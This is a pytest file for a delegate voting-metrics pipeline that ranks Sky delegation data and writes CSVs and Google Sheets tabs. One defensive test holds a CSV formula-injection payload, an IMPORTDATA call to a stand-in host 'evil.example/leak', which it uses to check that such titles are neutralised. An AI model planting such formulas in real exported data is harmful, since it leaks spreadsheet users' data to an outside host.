"""Tests for pipeline.run and its helpers."""

from datetime import date
from unittest.mock import MagicMock, patch

import gspread
import pandas as pd

from ad_voting_metrics import pipeline
from ad_voting_metrics.period import MonthPeriod
from ad_voting_metrics.pipeline import (
    _build_sky_and_ranking_frames,
    _write_csvs,
    _write_workbook_tabs,
    run,
)
from ad_voting_metrics.roster import Delegate

# ---------------------------------------------------------------------------
# _build_sky_and_ranking_frames — pure delegation-output transform
# ---------------------------------------------------------------------------


def test_build_sky_and_ranking_frames_sorts_sky_and_ranks_delegates():
    """df_sky sorted by (date, sky, contract) desc; df_ranking has Rank per date."""
    period = MonthPeriod(year=2026, month=4)
    canned = pd.DataFrame(
        [
            {"contract": "0xa", "name": "alpha", "date": date(2026, 4, 1), "sky": 100.0},
            {"contract": "0xb", "name": "beta", "date": date(2026, 4, 1), "sky": 300.0},
            {"contract": "0xc", "name": "gamma", "date": date(2026, 4, 1), "sky": 200.0},
        ]
    )
    df_input = pd.DataFrame(
        {
            "Delegate Name": ["alpha", "beta", "gamma"],
            "Delegate Contract": ["0xa", "0xb", "0xc"],
            "Start Date": ["2024-01-01"] * 3,
        }
    )

    with patch(
        "ad_voting_metrics.pipeline.delegation.get_delegate_list_sky",
        return_value=canned,
    ) as delegation_mock:
        df_sky, df_ranking = _build_sky_and_ranking_frames(df_input, period, rebuild=False)

    delegation_mock.assert_called_once_with(df_input, period, rebuild=False)

    # df_sky: highest sky first (300), then 200, then 100.
    assert df_sky.iloc[0]["sky"] == 300.0
    assert df_sky.iloc[-1]["sky"] == 100.0

    # df_ranking: ranks computed from Total Delegation desc per Date.
    ranks_by_delegate = df_ranking.set_index("Delegate")["Rank"].to_dict()
    assert ranks_by_delegate == {"beta": 1, "gamma": 2, "alpha": 3}


# ---------------------------------------------------------------------------
# _write_csvs — file IO to OUTPUT_DIR
# ---------------------------------------------------------------------------


def test_write_csvs_writes_both_files_and_returns_paths(tmp_path, monkeypatch):
    """Writes sky.csv and vote_participation.csv to OUTPUT_DIR; returns both paths in order."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)

    df_sky = pd.DataFrame([{"contract": "0xa", "date": date(2026, 4, 1), "sky": 100.0}])
    df = pd.DataFrame(
        {
            "Delegate Name": ["alpha"],
            "Delegate Contract": ["0xa"],
            "Start Date": ["2024-01-01"],
            "101": ["Yes"],
        }
    )
    poll_info = [{"pollId": 101, "startDate": date(2026, 4, 1), "endDate": date(2026, 4, 3), "title": "Test"}]
    spell_info: list[dict] = []

    result = _write_csvs(df, df_sky, poll_info, spell_info)

    assert [p.name for p in result] == ["sky.csv", "vote_participation.csv"]
    assert all(p.exists() for p in result)
    assert (tmp_path / "sky.csv").read_text().splitlines()[0] == "contract,date,sky"


def test_write_csvs_defuses_formula_like_titles(tmp_path, monkeypatch):
    """API-sourced titles starting with a formula character are quoted so spreadsheet apps render them as text."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)

    df_sky = pd.DataFrame([{"contract": "0xa", "date": date(2026, 4, 1), "sky": 100.0}])
    df = pd.DataFrame(
        {
            "Delegate Name": ["alpha"],
            "Delegate Contract": ["0xa"],
            "Start Date": ["2024-01-01"],
            "101": ["Yes"],
        }
    )
    poll_info = [
        {
            "pollId": 101,
            "startDate": date(2026, 4, 1),
            "endDate": date(2026, 4, 3),
            "title": '=IMPORTDATA("https://evil.example/leak")',
        },
    ]

    _write_csvs(df, df_sky, poll_info, [])

    participation = (tmp_path / "vote_participation.csv").read_text()
    assert "'=IMPORTDATA" in participation
    assert '"=IMPORTDATA' not in participation


# ---------------------------------------------------------------------------
# _write_workbook_tabs — sheets writer orchestration
# ---------------------------------------------------------------------------


def test_write_workbook_tabs_calls_three_writers_on_success():
    """All three tab writers are invoked when get_workbook succeeds."""
    period = MonthPeriod(year=2026, month=4)
    workbook = MagicMock()

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=workbook),
        patch("ad_voting_metrics.pipeline.sheets.write_participation_raw_data") as p_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    p_mock.assert_called_once()
    c_mock.assert_called_once()
    d_mock.assert_called_once()


def test_write_workbook_tabs_skips_tabs_when_workbook_open_fails():
    """If get_workbook raises RuntimeError, no tab writer runs and no exception propagates."""
    period = MonthPeriod(year=2026, month=4)

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", side_effect=RuntimeError("auth")),
        patch("ad_voting_metrics.pipeline.sheets.write_participation_raw_data") as p_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    p_mock.assert_not_called()
    c_mock.assert_not_called()
    d_mock.assert_not_called()


def test_write_workbook_tabs_continues_after_value_error():
    """A ValueError from one writer is logged; remaining writers still run."""
    period = MonthPeriod(year=2026, month=4)
    workbook = MagicMock()

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=workbook),
        patch(
            "ad_voting_metrics.pipeline.sheets.write_participation_raw_data",
            side_effect=ValueError("bad df"),
        ),
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    c_mock.assert_called_once()
    d_mock.assert_called_once()


def test_write_workbook_tabs_continues_after_gspread_api_error():
    """A gspread APIError from a writer is logged; remaining writers still run."""
    period = MonthPeriod(year=2026, month=4)
    workbook = MagicMock()
    # APIError's constructor takes a response; mimic the bits the formatter touches.
    api_error = gspread.exceptions.APIError(MagicMock(status_code=500, json=dict))

    with (
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=workbook),
        patch(
            "ad_voting_metrics.pipeline.sheets.write_participation_raw_data",
            side_effect=api_error,
        ),
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
    ):
        _write_workbook_tabs(period, pd.DataFrame(), pd.DataFrame(), [], [])

    c_mock.assert_called_once()
    d_mock.assert_called_once()


# ---------------------------------------------------------------------------
# run — end-to-end orchestration with everything mocked
# ---------------------------------------------------------------------------


def _canned_delegation_outputs(period: MonthPeriod, contract: str, name: str) -> pd.DataFrame:
    """Return a get_delegate_list_sky-shaped DataFrame covering one delegate for every day in period."""
    days = list(pd.date_range(period.start, period.end, freq="D").date)
    return pd.DataFrame([{"contract": contract, "name": name, "date": d, "sky": 100.0} for d in days])


def test_run_writes_csvs_and_workbook_tabs(tmp_path, monkeypatch):
    """End-to-end run with all externals mocked → CSVs + 3 workbook tabs written."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)
    monkeypatch.setattr(pipeline, "RECONCILIATION_LOG_PATH", tmp_path / "rec")

    period = MonthPeriod(year=2026, month=4)
    contract = "0x" + "a" * 40
    delegates = [
        Delegate(name="alpha", vote_delegate_address=contract, start_date=date(2024, 1, 1)),
    ]
    canned = _canned_delegation_outputs(period, contract, "alpha")

    with (
        patch("ad_voting_metrics.pipeline.build_roster_for_period") as mock_roster,
        patch("ad_voting_metrics.pipeline.delegation.get_delegate_list_sky", return_value=canned),
        patch("ad_voting_metrics.pipeline.sky_polling.fetch_polls_for_period", return_value=[]),
        patch("ad_voting_metrics.pipeline.sky_executive.fetch_spells_for_period", return_value=[]),
        patch(
            "ad_voting_metrics.pipeline.sky_polling.add_poll_vote_statuses",
            side_effect=lambda _poll_info, df, _sky_lookup, current_datetime: df,  # noqa: ARG005
        ),
        patch(
            "ad_voting_metrics.pipeline.sky_executive.add_spell_vote_statuses",
            side_effect=lambda _spell_info, df, _sky_lookup: df,
        ),
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", return_value=MagicMock()),
        patch("ad_voting_metrics.pipeline.sheets.write_participation_raw_data") as p_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_communication_master") as c_mock,
        patch("ad_voting_metrics.pipeline.sheets.write_daily_data") as d_mock,
        patch("ad_voting_metrics.pipeline.write_entry") as entry_mock,
    ):
        mock_roster.return_value = MagicMock(
            active_delegates=delegates,
            drift_warnings=[],
            yaml_config=MagicMock(delegates=delegates),
            api_delegate_count=1,
            api_fetch_succeeded=True,
        )
        run(period, rebuild=False)

    assert (tmp_path / "sky.csv").exists()
    assert (tmp_path / "vote_participation.csv").exists()
    p_mock.assert_called_once()
    c_mock.assert_called_once()
    d_mock.assert_called_once()
    entry_mock.assert_called_once()


def test_run_logs_drift_warnings(tmp_path, monkeypatch):
    """Drift warnings on the roster surface through logger.warning."""
    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)
    monkeypatch.setattr(pipeline, "RECONCILIATION_LOG_PATH", tmp_path / "rec")

    period = MonthPeriod(year=2026, month=4)
    contract = "0x" + "b" * 40
    delegates = [
        Delegate(name="beta", vote_delegate_address=contract, start_date=date(2024, 1, 1)),
    ]
    canned = _canned_delegation_outputs(period, contract, "beta")

    with (
        patch("ad_voting_metrics.pipeline.build_roster_for_period") as mock_roster,
        patch("ad_voting_metrics.pipeline.delegation.get_delegate_list_sky", return_value=canned),
        patch("ad_voting_metrics.pipeline.sky_polling.fetch_polls_for_period", return_value=[]),
        patch("ad_voting_metrics.pipeline.sky_executive.fetch_spells_for_period", return_value=[]),
        patch(
            "ad_voting_metrics.pipeline.sky_polling.add_poll_vote_statuses",
            side_effect=lambda _poll_info, df, _sky_lookup, current_datetime: df,  # noqa: ARG005
        ),
        patch(
            "ad_voting_metrics.pipeline.sky_executive.add_spell_vote_statuses",
            side_effect=lambda _spell_info, df, _sky_lookup: df,
        ),
        patch("ad_voting_metrics.pipeline.sheets.get_workbook", side_effect=RuntimeError("no workbook")),
        patch("ad_voting_metrics.pipeline.write_entry"),
        patch.object(pipeline.logger, "warning") as warning_mock,
    ):
        mock_roster.return_value = MagicMock(
            active_delegates=delegates,
            drift_warnings=["YAML lists Z but API doesn't"],
            yaml_config=MagicMock(delegates=delegates),
            api_delegate_count=1,
            api_fetch_succeeded=True,
        )
        run(period, rebuild=False)

    warning_mock.assert_any_call("YAML lists Z but API doesn't")
